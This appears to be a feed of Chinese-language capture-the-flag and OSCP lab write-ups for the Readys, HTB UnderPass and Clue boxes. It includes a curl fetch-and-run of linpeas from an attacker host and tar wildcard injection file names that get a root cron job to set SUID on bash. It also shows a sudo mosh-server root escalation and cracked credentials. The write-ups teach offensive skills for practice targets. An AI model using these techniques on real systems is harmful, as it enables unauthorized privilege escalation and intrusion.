&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;91&#34; src=&#34;../legacy/uploads/2025/05/1748420835-image-1024x91.png&#34; alt=&#34;&#34; class=&#34;wp-image-1458&#34; srcset=&#34;../legacy/uploads/2025/05/1748420835-image-1024x91.png 1024w, ../legacy/uploads/2025/05/1748420835-image-300x27.png 300w, ../legacy/uploads/2025/05/1748420835-image-768x68.png 768w, ../legacy/uploads/2025/05/1748420835-image.png 1239w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;没有连接.. 可能是编码的问题？用url编码试试. 随便找了个&lt;a href=&#34;https://www.urlencoder.org/&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;url encoder&lt;/a&gt;网站：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;739&#34; src=&#34;../legacy/uploads/2025/05/1748420943-image-1024x739.png&#34; alt=&#34;&#34; class=&#34;wp-image-1460&#34; srcset=&#34;../legacy/uploads/2025/05/1748420943-image-1024x739.png 1024w, ../legacy/uploads/2025/05/1748420943-image-300x216.png 300w, ../legacy/uploads/2025/05/1748420943-image-768x554.png 768w, ../legacy/uploads/2025/05/1748420943-image.png 1400w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;再次尝试：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;976&#34; height=&#34;77&#34; src=&#34;../legacy/uploads/2025/05/1748420965-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1462&#34; srcset=&#34;../legacy/uploads/2025/05/1748420965-image.png 976w, ../legacy/uploads/2025/05/1748420965-image-300x24.png 300w, ../legacy/uploads/2025/05/1748420965-image-768x61.png 768w&#34; sizes=&#34;auto, (max-width: 976px) 100vw, 976px&#34; /&gt; &lt;/figure&gt; &lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;859&#34; height=&#34;132&#34; src=&#34;../legacy/uploads/2025/05/1748420977-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1463&#34; srcset=&#34;../legacy/uploads/2025/05/1748420977-image.png 859w, ../legacy/uploads/2025/05/1748420977-image-300x46.png 300w, ../legacy/uploads/2025/05/1748420977-image-768x118.png 768w&#34; sizes=&#34;auto, (max-width: 859px) 100vw, 859px&#34; /&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;成功获得shell. 用python升级一下刀tty shell.&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: python; title: ; notranslate&#34; title=&#34;&#34;&gt;
python3 -c &amp;#039;import pty;pty.spawn(&#34;/bin/bash&#34;)&amp;#039;
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;在alice home下找到local.txt&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;356&#34; height=&#34;69&#34; src=&#34;../legacy/uploads/2025/05/1748421080-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1465&#34; srcset=&#34;../legacy/uploads/2025/05/1748421080-image.png 356w, ../legacy/uploads/2025/05/1748421080-image-300x58.png 300w&#34; sizes=&#34;auto, (max-width: 356px) 100vw, 356px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;root&#34;&gt;Root
&lt;/h2&gt;&lt;p&gt;上传linpeas并运行：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
alice@readys:/home/alice$ curl -o lin http://192.168.45.202/linpeas
curl -o lin http://192.168.45.202/linpeas
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3151k  100 3151k    0     0   430k      0  0:00:07  0:00:07 --:--:--  488k
alice@readys:/home/alice$ chmod +x lin
chmod +x lin
alice@readys:/home/alice$ ./lin
&lt;/pre&gt;
&lt;/div&gt;&lt;figure class=&#34;wp-block-image size-full&#34;&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;511&#34; height=&#34;35&#34; src=&#34;../legacy/uploads/2025/05/1748421215-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1469&#34; srcset=&#34;../legacy/uploads/2025/05/1748421215-image.png 511w, ../legacy/uploads/2025/05/1748421215-image-300x21.png 300w&#34; sizes=&#34;auto, (max-width: 511px) 100vw, 511px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;发现root运行了一个cronjob, 看看这个文件里是什么:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
cat /usr/local/bin/backup.sh
#!/bin/bash
&lt;p&gt;cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;这个任务会先进入/var/www/html, 并把目录下的文件打包起来。***** 使得我们可以把文件名当做参数传递给 tar. 看到tar 和 * 就能想到wildcard attack了，之前有做过这样的靶机. 这篇&lt;a href=&#34;https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;博客&lt;/a&gt;里有详细教程.&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
cd /var/www/html
echo &#34;12312331232231&#34; &amp;gt; &amp;#039;--checkpoint=1&amp;#039;
echo &#34;1212331232231312&#34; &amp;gt; &amp;#039;--checkpoint-action=exec=sh pe.sh&amp;#039;
echo &#34;chmod u+s /bin/bash&#34; &amp;gt; pe.sh
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;登记分钟后, /bin/bash就会被加上 suid:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
alice@readys:/var/www/html$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
alice@readys:/var/www/html$ /bin/bash -p
/bin/bash -p
bash-5.0# id
id
uid=1000(alice) gid=1000(alice) euid=0(root) groups=1000(alice)
bash-5.0# cd /root
cd /root
bash-5.0# ls
ls
proof.txt
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;在root下找到proof.txt&lt;/p&gt;
&lt;h2 id=&#34;我学到了什么&#34;&gt;我学到了什么
&lt;/h2&gt;&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    /etc/systemd/system/xxx.service文件 包含有service的信息 例如读写权限
  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Happy Hacking&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HTB-UnderPass-Writeup</title>
        <link>http://localhost:1313/htb-underpass-Writeup/</link>
        <pubDate>Mon, 12 May 2025 16:01:18 +0000</pubDate>
        
        <guid>http://localhost:1313/htb-underpass-Writeup/</guid>
        <description>&lt;img src="http://localhost:1313/legacy/uploads/2025/05/1747065644-456a4d2e52f182847fb0a2dba0420a44.webp" alt="Featured image of post HTB-UnderPass-Writeup" /&gt;&lt;div class=&#34;wp-block-image&#34;&gt;
  &lt;figure class=&#34;aligncenter size-full&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;300&#34; height=&#34;300&#34; src=&#34;../legacy/uploads/2025/05/1747065644-456a4d2e52f182847fb0a2dba0420a44.webp&#34; alt=&#34;&#34; class=&#34;wp-image-1413&#34; srcset=&#34;../legacy/uploads/2025/05/1747065644-456a4d2e52f182847fb0a2dba0420a44.webp 300w, ../legacy/uploads/2025/05/1747065644-456a4d2e52f182847fb0a2dba0420a44-150x150.webp 150w&#34; sizes=&#34;auto, (max-width: 300px) 100vw, 300px&#34; /&gt;&lt;/figure&gt;
&lt;/div&gt;
&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    Difficulty: Easy
  &lt;/li&gt;
  &lt;li&gt;
    OS: Linux
  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nmap-result&#34;&gt;Nmap result
&lt;/h2&gt;&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.52 (Ubuntu)
&lt;p&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration
&lt;/h2&gt;&lt;p&gt;80端口是apache的默认网页，用ffuf遍历directory和files：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;581&#34; src=&#34;../legacy/uploads/2025/05/1747056859-image-1024x581.png&#34; alt=&#34;&#34; class=&#34;wp-image-1388&#34; srcset=&#34;../legacy/uploads/2025/05/1747056859-image-1024x581.png 1024w, ../legacy/uploads/2025/05/1747056859-image-300x170.png 300w, ../legacy/uploads/2025/05/1747056859-image-768x436.png 768w, ../legacy/uploads/2025/05/1747056859-image-1536x872.png 1536w, ../legacy/uploads/2025/05/1747056859-image.png 1549w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.11.48/FUZZ                               
&lt;p&gt;server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 215ms]
:: Progress: [29999/29999] :: Job [1/1] :: 190 req/sec :: Duration: [0:02:48] :: Errors: 1 ::&lt;/p&gt;
&lt;p&gt;ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://10.10.11.48/FUZZ&lt;/p&gt;
&lt;p&gt;index.html              [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 370ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 239ms]
.                       [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 191ms]
.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 189ms]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 332ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 198ms]
.htm                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 190ms]
.htpasswds              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 191ms]
.htgroup                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 195ms]
wp-forum.phps           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 191ms]
.htaccess.bak           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 190ms]
.htuser                 [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 189ms]
.htc                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 190ms]
.ht                     [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 270ms]
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;都是些默认的网页，没有任何有用的信息。扫描一下UDP端口看看：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
sudo nmap -sU --top-ports 200 10.10.11.48                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 00:03 AEST
Nmap scan report for 10.10.11.48
Host is up (0.19s latency).
Not shown: 197 closed udp ports (port-unreach)
PORT     STATE         SERVICE
161/udp  open          snmp
1812/udp open|filtered radius
1813/udp open|filtered radacct
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;161 snmp开放，用snmpwalk看看有什么信息：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;497&#34; src=&#34;../legacy/uploads/2025/05/1747059643-image-1024x497.png&#34; alt=&#34;&#34; class=&#34;wp-image-1390&#34; srcset=&#34;../legacy/uploads/2025/05/1747059643-image-1024x497.png 1024w, ../legacy/uploads/2025/05/1747059643-image-300x146.png 300w, ../legacy/uploads/2025/05/1747059643-image-768x373.png 768w, ../legacy/uploads/2025/05/1747059643-image.png 1372w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;显示出了一个用户名steve@underpass.htb 先做记录 并知道部署了名为daloradius的服务？尝试http下访问/daloradius试试：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;656&#34; height=&#34;312&#34; src=&#34;../legacy/uploads/2025/05/1747059747-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1391&#34; srcset=&#34;../legacy/uploads/2025/05/1747059747-image.png 656w, ../legacy/uploads/2025/05/1747059747-image-300x143.png 300w&#34; sizes=&#34;auto, (max-width: 656px) 100vw, 656px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;显示forbidden，但知道确实是有这个目录的 用feroxbuster递归遍历/daloradius下有什么目录:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;384&#34; src=&#34;../legacy/uploads/2025/05/1747060451-image-1024x384.png&#34; alt=&#34;&#34; class=&#34;wp-image-1393&#34; srcset=&#34;../legacy/uploads/2025/05/1747060451-image-1024x384.png 1024w, ../legacy/uploads/2025/05/1747060451-image-300x112.png 300w, ../legacy/uploads/2025/05/1747060451-image-768x288.png 768w, ../legacy/uploads/2025/05/1747060451-image.png 1307w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;initial-foothold&#34;&gt;Initial Foothold
&lt;/h2&gt;&lt;p&gt;访问了几个全是404 Not Found 谷歌搜了一下，找到了&lt;a href=&#34;https://github.com/lirantal/daloradius&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;daloradius&lt;/a&gt;的github repo. 在 /app/users/ 和 /app/operators/ 下分别发现了login.php&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;424&#34; height=&#34;694&#34; src=&#34;../legacy/uploads/2025/05/1747060607-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1394&#34; srcset=&#34;../legacy/uploads/2025/05/1747060607-image.png 424w, ../legacy/uploads/2025/05/1747060607-image-183x300.png 183w&#34; sizes=&#34;auto, (max-width: 424px) 100vw, 424px&#34; /&gt; &lt;/figure&gt; &lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;383&#34; height=&#34;328&#34; src=&#34;../legacy/uploads/2025/05/1747060630-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1395&#34; srcset=&#34;../legacy/uploads/2025/05/1747060630-image.png 383w, ../legacy/uploads/2025/05/1747060630-image-300x257.png 300w&#34; sizes=&#34;auto, (max-width: 383px) 100vw, 383px&#34; /&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;查看operators下面的login.php，应该是admin用户的登录界面：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;964&#34; height=&#34;827&#34; src=&#34;../legacy/uploads/2025/05/1747060710-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1396&#34; srcset=&#34;../legacy/uploads/2025/05/1747060710-image.png 964w, ../legacy/uploads/2025/05/1747060710-image-300x257.png 300w, ../legacy/uploads/2025/05/1747060710-image-768x659.png 768w&#34; sizes=&#34;auto, (max-width: 964px) 100vw, 964px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试弱口令爆破 admin:admin root:root 之类的都失败。谷歌搜索daloradius默认密码:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;340&#34; src=&#34;../legacy/uploads/2025/05/1747060761-image-1024x340.png&#34; alt=&#34;&#34; class=&#34;wp-image-1397&#34; srcset=&#34;../legacy/uploads/2025/05/1747060761-image-1024x340.png 1024w, ../legacy/uploads/2025/05/1747060761-image-300x100.png 300w, ../legacy/uploads/2025/05/1747060761-image-768x255.png 768w, ../legacy/uploads/2025/05/1747060761-image.png 1072w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;搜到了administrator:radius 尝试登录试试:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;412&#34; src=&#34;../legacy/uploads/2025/05/1747060795-image-1024x412.png&#34; alt=&#34;&#34; class=&#34;wp-image-1399&#34; srcset=&#34;../legacy/uploads/2025/05/1747060795-image-1024x412.png 1024w, ../legacy/uploads/2025/05/1747060795-image-300x121.png 300w, ../legacy/uploads/2025/05/1747060795-image-768x309.png 768w, ../legacy/uploads/2025/05/1747060795-image-1536x617.png 1536w, ../legacy/uploads/2025/05/1747060795-image.png 1928w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;登陆成功. 在config-&amp;gt;Database Settings 下找到了steve登录数据库的密码 先做记录:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;824&#34; src=&#34;../legacy/uploads/2025/05/1747060923-image-1024x824.png&#34; alt=&#34;&#34; class=&#34;wp-image-1401&#34; srcset=&#34;../legacy/uploads/2025/05/1747060923-image-1024x824.png 1024w, ../legacy/uploads/2025/05/1747060923-image-300x241.png 300w, ../legacy/uploads/2025/05/1747060923-image-768x618.png 768w, ../legacy/uploads/2025/05/1747060923-image.png 1029w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在Management-&amp;gt; List Users下发现了用户svcMosh的密码hash：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;418&#34; src=&#34;../legacy/uploads/2025/05/1747060981-image-1024x418.png&#34; alt=&#34;&#34; class=&#34;wp-image-1402&#34; srcset=&#34;../legacy/uploads/2025/05/1747060981-image-1024x418.png 1024w, ../legacy/uploads/2025/05/1747060981-image-300x122.png 300w, ../legacy/uploads/2025/05/1747060981-image-768x314.png 768w, ../legacy/uploads/2025/05/1747060981-image.png 1369w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试了用rockyou.txt 爆破但失败 用在线的&lt;a href=&#34;https://crackstation.net/&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;hash cracker&lt;/a&gt;爆破试试 得到了密码 underwaterfriends&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;382&#34; src=&#34;../legacy/uploads/2025/05/1747061982-image-1024x382.png&#34; alt=&#34;&#34; class=&#34;wp-image-1403&#34; srcset=&#34;../legacy/uploads/2025/05/1747061982-image-1024x382.png 1024w, ../legacy/uploads/2025/05/1747061982-image-300x112.png 300w, ../legacy/uploads/2025/05/1747061982-image-768x286.png 768w, ../legacy/uploads/2025/05/1747061982-image-1536x573.png 1536w, ../legacy/uploads/2025/05/1747061982-image.png 1574w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试用得到的两个creds ssh登录：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;882&#34; height=&#34;830&#34; src=&#34;../legacy/uploads/2025/05/1747062506-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1405&#34; srcset=&#34;../legacy/uploads/2025/05/1747062506-image.png 882w, ../legacy/uploads/2025/05/1747062506-image-300x282.png 300w, ../legacy/uploads/2025/05/1747062506-image-768x723.png 768w&#34; sizes=&#34;auto, (max-width: 882px) 100vw, 882px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;svcMosh登陆成功，在svcMosh home下得到user flag&lt;/p&gt;
&lt;h2 id=&#34;root&#34;&gt;Root
&lt;/h2&gt;&lt;p&gt;svcMosh 可以以root运行mosh-server 尝试运行一下&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
&lt;p&gt;User svcMosh may run the following commands on localhost:
(ALL) NOPASSWD: /usr/bin/mosh-server&lt;/p&gt;
&lt;p&gt;svcMosh@underpass:~$ sudo /usr/bin/mosh-server&lt;/p&gt;
&lt;p&gt;MOSH CONNECT 60001 8wj02XSCCavC9qc0IZjfgg&lt;/p&gt;
&lt;p&gt;mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein &amp;lt;mosh-devel@mit.edu&amp;gt;
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.&lt;/p&gt;
&lt;p&gt;[mosh-server detached, pid = 2139]
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;显示mosh-server版本1.3.2 谷歌一下这个mosh-server 是一个remote shell 在官网下可以找到连接方式. &lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;622&#34; src=&#34;../legacy/uploads/2025/05/1747063473-image-1024x622.png&#34; alt=&#34;&#34; class=&#34;wp-image-1408&#34; srcset=&#34;../legacy/uploads/2025/05/1747063473-image-1024x622.png 1024w, ../legacy/uploads/2025/05/1747063473-image-300x182.png 300w, ../legacy/uploads/2025/05/1747063473-image-768x466.png 768w, ../legacy/uploads/2025/05/1747063473-image.png 1207w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试用这个方法连接试试&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
MOSH_KEY=dR19ewhTJqeSCt+il21otA mosh-client 127.0.0.1 60001
&lt;/pre&gt;
&lt;/div&gt;&lt;figure class=&#34;wp-block-image size-full&#34;&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;846&#34; height=&#34;830&#34; src=&#34;../legacy/uploads/2025/05/1747065024-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1410&#34; srcset=&#34;../legacy/uploads/2025/05/1747065024-image.png 846w, ../legacy/uploads/2025/05/1747065024-image-300x294.png 300w, ../legacy/uploads/2025/05/1747065024-image-768x753.png 768w&#34; sizes=&#34;auto, (max-width: 846px) 100vw, 846px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;连接后获得了root权限 并在当前目录下找到root.txt&lt;/p&gt;
&lt;p&gt;Happy Hacking&lt;/p&gt;
</description>
        </item>
        <item>
        <title>OSCP-PGP Clue Writeup</title>
        <link>http://localhost:1313/oscp-pgp-clue-writeup/</link>
        <pubDate>Fri, 25 Apr 2025 14:19:39 +0000</pubDate>
        
        <guid>http://localhost:1313/oscp-pgp-clue-writeup/</guid>
        <description>&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    Difficulty: Hard
  &lt;/li&gt;
  &lt;li&gt;
    Community Rate: Very Hard
  &lt;/li&gt;
  &lt;li&gt;
    OS: Linux
  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nmap-results&#34;&gt;Nmap Results
&lt;/h2&gt;&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE          REASON         VERSION
22/tcp   open  ssh              syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
80/tcp   open  http             syn-ack ttl 61 Apache httpd 2.4.38
|_http-title: 403 Forbidden
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  open  netbios-ssn      syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
